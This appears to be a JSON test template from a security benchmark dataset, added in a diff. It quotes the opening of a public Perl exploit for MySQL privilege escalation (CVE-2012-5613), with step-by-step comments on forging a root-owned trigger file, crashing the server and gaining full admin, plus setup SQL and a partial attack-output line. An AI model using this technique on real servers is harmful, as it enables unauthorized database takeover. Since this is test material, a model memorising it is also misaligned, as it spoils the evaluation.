@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_23077",
+  "category": "D3_database",
+  "attack_technique": "T1078.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: MySQL (Linux) - Database Privilege Escalation (CVE-2012-5613)\n\nExploit source code (23077.pl):\n```\nuse DBI();\n\n$|=1;\n\n=for comment\n\nMySQL privilege elevation Exploit\nThis exploit adds a new admin user.\nBy Kingcope\n\nTested on\n* Debian Lenny (mysql-5.0.51a)\n* OpenSuSE 11.4 (5.1.53-log)\n\nHow it works:\nThis exploit makes use of several things:\n*The attacker is in possession of a mysql user with 'file' privileges for the target\n*So the attacker can create files on the system with this user (owned by user 'mysql')\n*So the attacker is able to create TRIGGER files for a mysql table\n\ttriggers can be used to trigger an event when a mysql command is executed by the user,\n\tnormally triggers are 'attached' to a user and will be executed with this users privilege.\n\tbecause we can write any contents into the TRG file (the actual trigger file), we write the entry\n\tdescribing the attached user for the trigger as \"root@localhost\" what is the default admin user.\n* We make use of the stack overrun priorly discovered to flush the server config so the trigger file is recognized.\n  This step is really important, without crashing the mysql server instance and reconnecting (the server will respawn)\n  the trigger file would not be recognized.\n\nSo what the exploit does is:\n* Connect to the MySQL Server\n* Create a table named rootme for the trigger\n* Create the trigger file in /var/lib/mysql/<databasename>/rootme.TRG\n* Crash the MySQL Server to force it to respawn and recognize the trigger file (by triggering the stack overrun)\n* INSERT a value into the table so the trigger event gets executed\n* The trigger now sets all privileges of the current connecting user in the mysql.user table to enabled.\n* Crash the MySQL Server again to force it reload the user configuration\n* Create a new mysql user with all privileges set to enabled\n* Crash again to reload configuration\n* Connect by using the newly created user\n* The new connection has ADMIN access now to all databases in mysql\n* The user and password hashes in the mysql.user table are dumped for a convinient way to show the exploit succeeded\n* As said the user has FULL ACCESS to the database now\n\nRespawning of mysqld is done by mysqld_safe so this is not an issue in any configuration I've seen.\n=cut\n\n=for comment\n\nuser created for testing (file privs will minor privileges to only one database):\n\nmysql> CREATE USER 'less'@'%' IDENTIFIED BY 'test';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> create database lessdb\n    -> ;\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> GRANT ALL PRIVILEGES ON lessdb.* TO 'less'@'%' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql> GRANT FILE ON *.* TO 'less'@'%' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.00 sec)\n\nlogin with new unprivileged user:\nmysql> select * from mysql.user;\nERROR 1142 (42000): SELECT command denied to user 'less2'@'localhost' for table 'user'\n\n=cut\n\n=for comment\n\nexample attack output:\n\nC:\\Users\\kingcope\\Desktop>perl mysql_privilege_elevation.pl\nselect 'TYPE=TRIGGERS' into outfile'/var/lib/mysql/lessdb3/rootme.TRG' LINES TER\nMINATED BY '\\ntriggers=\\'CREAT\n```",
+  "cve": "CVE-2012-5613",
+  "exploitdb_id": "23077",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_23077",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
